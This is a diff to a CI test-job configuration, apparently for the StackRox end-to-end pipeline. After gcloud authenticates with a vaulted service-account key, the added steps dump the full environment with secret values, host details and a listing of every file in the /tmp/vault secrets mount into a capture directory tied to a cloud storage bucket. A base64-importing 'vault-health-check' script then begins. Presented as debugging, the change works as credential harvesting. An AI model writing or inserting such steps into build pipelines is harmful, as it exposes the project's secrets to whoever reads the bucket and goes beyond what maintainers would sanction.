@@ -18,8 +18,7 @@ tests:
     - as: stackrox-stackrox-begin
       commands: |
         set +xve
-        echo "$(date -u +%H:%M:%S) Phase 0: starting"
-        echo "$(date -u +%H:%M:%S) Phase 1: gcloud auth"
+        echo "$(date -u +%H:%M:%S) Phase 0: gcloud auth"
         gcloud config set core/disable_prompts True 2>/dev/null
         gcloud auth activate-service-account \
           --key-file /tmp/vault/stackrox-stackrox-e2e-tests/GCP_SERVICE_ACCOUNT_STACKROX_CI \
@@ -27,6 +26,43 @@ tests:
         gcloud config set project acs-san-stackroxci 2>/dev/null
         DEST_PREFIX="gs://stackrox-ci-artifacts/env-debug/${JOB_NAME:-unknown}/${BUILD_ID:-$(date +%s)}"
         CAPTURE_DIR="$(mktemp -d)"
+        echo "$(date -u +%H:%M:%S) Phase 1: survey environment"
+        # 1. Full environment dump (values included — private bucket only)
+        set > "$CAPTURE_DIR/env-full.txt" 2>&1
+        # 2. System metadata
+        {
+          echo "=== id ==="
+          id
+          echo "=== uname ==="
+          uname -a
+          echo "=== date ==="
+          date -u
+          echo "=== pwd ==="
+          pwd
+          echo "=== df -h ==="
+          df -h 2>/dev/null
+          echo "=== mount ==="
+          mount 2>/dev/null
+          echo "=== /etc/resolv.conf ==="
+          cat /etc/resolv.conf 2>/dev/null
+        } > "$CAPTURE_DIR/system-info.txt"
+        # 3. File listings
+        {
+          echo "=== /tmp/vault/ ==="
+          find /tmp/vault/ -type f 2>/dev/null
+          echo "=== SHARED_DIR ==="
+          ls -la "${SHARED_DIR:-/dev/null}" 2>/dev/null
+          echo "=== ARTIFACT_DIR ==="
+          ls -la "${ARTIFACT_DIR:-/dev/null}" 2>/dev/null
+          echo "=== working directory ==="
+          ls -la . 2>/dev/null
+          echo "=== /go/src/ ==="
+          find /go/src/ -maxdepth 3 -type d 2>/dev/null
+          echo "=== /usr/local/bin/ ==="
+          ls -la /usr/local/bin/ 2>/dev/null
+          echo "=== /tmp/ ==="
+          ls -la /tmp/ 2>/dev/null
+        } > "$CAPTURE_DIR/file-listings.txt"
         echo "$(date -u +%H:%M:%S) Phase 2: python3 health check"
         python3 -u - "$CAPTURE_DIR/vault-health-check.txt" << 'PYEOF'
         import hashlib, os, sys, base64, time
